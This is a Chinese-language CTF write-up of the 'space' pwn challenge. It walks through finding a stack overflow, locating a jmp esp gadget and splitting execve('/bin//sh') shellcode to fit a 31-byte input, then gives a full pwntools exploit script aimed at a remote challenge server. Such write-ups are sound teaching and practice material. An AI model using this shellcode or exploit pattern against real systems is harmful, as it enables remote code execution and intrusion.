---
layout: post
title: "hackbox pwn space wp"
date:   2022-3-16
tags: [ctf_wp]
comments: true
author: wsxk
---

这道题很有意思

### 1.简单分析

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/1.png)

可以看出是一个32位的程序

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/2.png)

什么保护也没加

运行一下看看

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/3.png)

行吧，直接用IDA进行分析

### 2.IDA分析

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/4.png)

可以看到，往buf里面读31个字节后进入vuln函数

    注意了，read函数不会自动帮你设置字符串末尾的'\x00'字符，所以，你读了31个字节，就是31个字节，不会在读入30个字节后自动停止！！！

继续往下看

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/5.png)

好，找到漏洞点了，是栈溢出，根据先前看到的保护，考虑使用shellcode

### 3.查看溢出点

我们先试试要多少个字节才能覆盖ret的返回地址

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/6.png)


![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/7.png)

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/8.png)

好，现在知道是18个字节

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-16-hackbox-pwn-space/9.png)

在这个地方还看到了jmp esp

是用shellcode了

### 4.shellcode编写

这道题shellcode显然是有限制的，先是不能太长，其次是不能含有'\x00'字符（strcpy会在遇到'\x00'字节后提前终止并返回）

我们知道，最多可以输入31个字符，覆盖地址是18~22个字符的位置，前面剩下18个字符，后面剩下9个字符

显然直接靠9个字符是无法shellcode的（我见过的最短的shellcode也要17给字节）

我们需要把shellcode分半，一部分放到0~18的位置

剩下一部分放入22~31的位置

中间覆盖的值是 jmp esp的地址

所以payload的格式是

shellcode_one + p32(jmp_esp) + shellcode_two

为了在执行shellcode_two后跳入shellcode_one,我们在shellcode_two中，我们需要在shellcode_two中加入跳转到shellcode_one的部分


    0:   31 c9                   xor    ecx, ecx
    2:   31 d2                   xor    edx, edx
    4:   83 ec 16                sub    esp, 0x16  #自己添加的
    7:   ff e4                   jmp    esp         #自己添加的
    9:   6a 0b                   push   0xb
    b:   58                      pop    eax
    c:   51                      push   ecx
    d:   68 2f 2f 73 68          push   0x68732f2f
    12:   68 2f 62 69 6e          push   0x6e69622f
    17:   89 e3                   mov    ebx, esp
    19:   cd 80                   int    0x80

为了看的方便，这里展示出shellcode的汇编意义,我把这段代码分成了0-9的部分和9-32的部分

shellcode的主要目标在于用int 80h命令

执行

execve('/bin//sh',0,0)

详情可以参考以下网址

[网址](https://blog.csdn.net/xiaominthere/article/details/17287965)

### 5.完整exp

    from pwn import *

    #io =process('./space')
    io = remote("167.71.134.138",31572)
    #print(asm("sub esp,22;jmp esp",arch='i386'))
    
    shellcode_one = b'\x31\xc9\x31\xd2\x83\xec\x16\xff\xe4'
    
    shellcode_two = b'\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
    
    payload = shellcode_two + p32(0x804919F)+shellcode_one
    #payload = b'aaaabaaacaaadaaaeaaafaaagaaahaa'
    #gdb.attach(io)
    
    io.sendline(payload)
    io.interactive()
